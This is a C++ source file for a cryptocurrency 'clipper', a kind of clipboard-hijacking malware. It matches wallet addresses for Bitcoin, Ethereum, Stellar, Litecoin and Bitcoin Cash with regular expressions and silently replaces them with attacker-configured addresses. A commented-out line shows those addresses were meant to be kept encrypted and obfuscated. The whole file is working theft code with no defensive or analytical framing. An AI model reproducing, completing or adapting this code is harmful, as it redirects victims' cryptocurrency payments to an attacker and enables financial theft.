#include "Clipper.h"
#include "Clipboard.h"
#include "Config.h"
#include "ClipboardManager.h"

#include <vector>
#include <unordered_map>
#include <iostream>


// Define a static member variable `PatternsList` of type `std::map`
// This map associates a string (the cryptocurrency abbreviation) with a regular expression for matching addresses.
std::map<std::string, std::regex> Clipper::PatternsList = {

    // Bitcoin (addresses start with 'bc1' or one of '1' or '3' followed by 25-39 alphanumeric characters)
    {"btc", std::regex("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$")},

    // Ethereum (addresses begin with '0x' followed by 40 hexadecimal characters)
    {"eth", std::regex("(?:^0x[a-fA-F0-9]{40}$)")},

    // Stellar (addresses start with 'G' followed by 55 alphanumeric characters)
    {"xlm", std::regex("(?:^G[0-9a-zA-Z]{55}$)")},

    // Litecoin (addresses begin with 'L', 'M', or '3' followed by 26-33 alphanumeric characters)
    {"ltc", std::regex("^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$")},

    // Bitcoin Cash (addresses start with 'bitcoincash:' or a prefix like 'q' or 'p' followed by 41 lowercase characters)
    {"bch", std::regex("^((bitcoincash:)?(q|p)[a-z0-9]{41})")},
};

// Function to replace the cryptocurrency address in the clipboard text.
bool Clipper::Replace()
{
    // Initialize `replaceTo` string which will store the type of cryptocurrency to replace.
    std::string replaceTo = "";

    // Get the current text from the clipboard using ClipboardManager.
    std::string buffer = ClipboardManager::ClipboardText;

    // If the clipboard is empty, return false as no address can be replaced.
    if (buffer.empty())
    {
        return false;
    }

    // Loop through each pattern in `PatternsList` to search for a matching address in the clipboard text.
    for (const auto& pattern : PatternsList)
    {
        // Get the regular expression for the current cryptocurrency pattern.
        std::regex regexPattern = pattern.second;

        // Create an iterator to find matches of the regex in the clipboard text.
        std::sregex_iterator it(buffer.begin(), buffer.end(), regexPattern);
        std::sregex_iterator end;

        // Iterate through all the matches found in the clipboard text.
        while (it != end)
        {
            // Print a message for each match found with the associated cryptocurrency type (e.g., "btc").
            //std::cout << "Match found for pattern [" << pattern.first << "]: " << it->str() << '\n';

            // Move to the next match.
            ++it;

            // Set `replaceTo` to the current cryptocurrency type (the map key).
            replaceTo = pattern.first;
        }
    }

    // If no match was found, `replaceTo` remains empty and we return false.
    if (replaceTo.empty())
    {
        return false;
    }

    // Create a map to store new addresses, presumably configured elsewhere in the program.
    std::unordered_map<std::string, std::string> NewAddresses{};

    // Loop through each entry in `Config::ClipperAddresses`, which stores old address mappings.
    for (const auto& pair : Config::ClipperAddresses) {
        const std::string& key = pair.first; // Cryptocurrency type (e.g., "btc", "eth").
        //const std::string& value = StringsCrypt::base64_decode(StringsCrypt::Decrypt(StringsCrypt::HexToString(pair.second)));
        
        const std::string& value = pair.second;

        // Store the decrypted and base64-decoded value into `NewAddresses` map.
        NewAddresses[key] = value;
    }

    // Look for the new address corresponding to the detected cryptocurrency type (`replaceTo`).
    auto it = NewAddresses.find(replaceTo);
    if (it != NewAddresses.end())
    {
        // Get the address to replace with.
        std::string ReplaceAddress = it->second;

        // Ensure the new address is valid: not empty, does not contain "---", and is not the same as the current address.
        if (!ReplaceAddress.empty() && (ReplaceAddress.find("---") == std::string::npos) && !(ReplaceAddress == buffer))
        {
            // Set the clipboard to the new address.
            Clipboard::SetText(ReplaceAddress);

            // Return true to indicate the replacement was successful.
            return true;
        }

    }
    else
        // If the address for `replaceTo` was not found in the map, print an error message.
        std::cout << "Key '" << replaceTo << "' not found in the map.\n";

    // If no valid replacement was made, return false.
    return false;
}
